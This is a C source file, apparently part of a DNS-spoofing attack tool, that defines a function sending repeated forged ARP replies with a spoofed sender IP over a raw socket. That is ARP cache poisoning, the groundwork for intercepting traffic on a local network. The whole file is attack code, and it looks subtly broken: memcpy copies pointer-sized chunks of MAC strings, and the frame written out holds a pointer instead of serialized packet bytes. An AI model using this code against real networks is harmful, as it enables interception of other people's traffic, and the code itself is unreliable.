#include "arpspf.h"
#include "arp.h"
#include "ip.h"
#include "eth.h"
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>

int dnsf_ckr_spoof_mac(const int sockfd,
                       const char *src_mac, const char *spf_src_ip,
                       const char *dest_mac, const char *dest_ip,
                       const size_t sent_nr, const int secs_out) {
    struct dnsf_ckr_ethernet_frame eth;
    struct dnsf_ckr_arp_header arp_packet;
    size_t s = 0;
    arp_packet.hwtype = ARP_HW_TYPE_ETHERNET;
    arp_packet.ptype = ARP_PROTO_TYPE_IP;
    arp_packet.hw_addr_len = 6;
    arp_packet.pt_addr_len = 4;
    arp_packet.opcode = ARP_OPCODE_REPLY;
    arp_packet.src_hw_addr = dnsf_ckr_mac2byte(src_mac, 6);
    arp_packet.src_pt_addr = dnsf_ckr_addr2byte(spf_src_ip, 4);
    arp_packet.dest_hw_addr = dnsf_ckr_mac2byte(dest_mac, 6);
    arp_packet.dest_pt_addr = dnsf_ckr_addr2byte(dest_ip, 4);
    eth.payload = dnsf_ckr_mk_arp_dgram(&eth.payload_size, arp_packet);
    eth.ptype = ETH_PROTO_TYPE_ARP;
    memcpy(eth.dest_hw_addr, dest_mac, sizeof(dest_mac));
    memcpy(eth.src_hw_addr, src_mac, sizeof(src_mac));
    while (s++ < sent_nr) {
        write(sockfd, (char *)&eth, 14 + eth.payload_size);
        sleep(secs_out);
    }
    free(arp_packet.src_hw_addr);
    free(arp_packet.src_pt_addr);
    free(arp_packet.dest_hw_addr);
    free(arp_packet.dest_pt_addr);
    free(eth.payload);
    return 1;
}
